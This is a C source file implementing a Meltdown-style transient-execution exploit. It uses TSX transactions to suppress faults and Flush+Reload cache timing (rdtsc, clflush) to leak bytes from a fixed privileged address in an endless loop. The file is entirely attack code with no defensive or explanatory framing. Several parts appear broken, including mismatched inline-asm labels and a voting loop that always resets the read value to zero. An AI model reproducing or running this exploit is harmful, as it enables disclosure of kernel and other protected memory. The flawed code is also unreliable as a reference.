#include <cpuid.h>
#include <errno.h>
#include <fcntl.h>
#include <memory.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include "rtm.h"

size_t cache_miss_threshold = 0; /**< Cache miss threshold in cycles for Flush+Reload */
static int measurements = 10; /**< Number of measurements to perform for one address */
static int accept_after = 1; /**< How many measurements must be the same to accept the read value */
static int retries = 10000; /**< Number of Meltdown retries for an address */
static char *mem = NULL;
static size_t phys_addr = 0x80000000;


static inline size_t rdtsc();
  asm (
    ".intel_syntax noprefix ;"
    "_rdtsc: ;"
    "mfence ;"
    "lfence ;"
    "rdtsc ;"
    "lfence ;"
    "ret ;"
  );


static inline void maccess(void *p);
  asm(
    ".intel_syntax noprefix ;"
    "_maccess:"
    "enter 0,0 ;"
    "mov eax, [ebp+8] ;"
    "leave ;"
    "ret ;"
  );


static void flush(void *p);
  asm (
    ".intel_syntax noprefix ;"
   "_flush: ;"
    "enter 0,0 ;"
    "clflush [ebp+8] ;"
    "leave ;"
    "ret ;"
  );


void calc_cache_threshold(){
  size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
  size_t dummy[16];
  size_t *ptr = dummy + 8;
  size_t start = 0, end = 0;

  maccess(ptr);
  for(int i = 0 ; i< count ; i++){
    start = rdtsc();
    maccess(ptr);
    end = rdtsc();
    reload_time += (end-start);
  }
  for(int i = 0; i<count; i++){
    start = rdtsc();
    maccess(ptr);
    end = rdtsc();
    flush(ptr);
    flush_reload_time += (end-start);
  }

  reload_time /= count;
  flush_reload_time /= count;

  cache_miss_threshold = (flush_reload_time + reload_time*2)/3;
}

int Flush_Reload(void *ptr){
size_t start = 0, end = 0;

start = rdtsc();
maccess(ptr);
end = rdtsc();

flush(ptr);
/*                                         */
if(end  - start < cache_miss_threshold){
  return 1;
}
  return 0;
}

void Meltdown(size_t p1, void *p2){
  asm volatile(
    ".intel_syntax noprefix;"
  //  "_Meltdown: ;"
    "enter 0,0 ;"
    "mov ecx, [ebp+8];"
    "mov ebx, [ebp+12];"
    "retry: ;"
    "mov eax, [ecx];"
    "shl eax, 0xc;"
    "jz retry;"
    "mov ebx, [ebx+eax];"
    "leave ;"
    "ret "
  );
}
int READ(size_t address){
/*                                                                */
  int value;
/* Define prope array and initilize it with zero as intial value */
char prope[256];
for(int i = 0 ; i < 256 ; i++)
  prope[i] = 0;
for (int i = 0 ; i < measurements ; i++){
/* Reading from memory using tsx as a exception suppression machenasim */
  while (retries--) {
    if (_xbegin() == _XBEGIN_STARTED){
      Meltdown(phys_addr, mem);
      _xend();
    }else{
      return 0;
    }
    for(int i = 0 ; i < 256 ; i++){
      if(Flush_Reload(mem + i*4096)){
        if(i>=1){
          value = i;
        }
      }
    }
  }
    value = 0;
    prope[value]++;
}
int max_v=0, max_i=0;
for (int i = 0 ; i < 256 ; i++){
  if(prope[i]>max_v && prope[i]>=accept_after){
    max_v = prope[i];
    max_i = i;
  }
}
return max_i;
}


int main(int argc, char const *argv[]) {
  calc_cache_threshold();
  printf("%d\n",cache_miss_threshold);

  while (1) {
    int value = READ(phys_addr);
    printf("%c\n", value);
  }

  return 0;
}
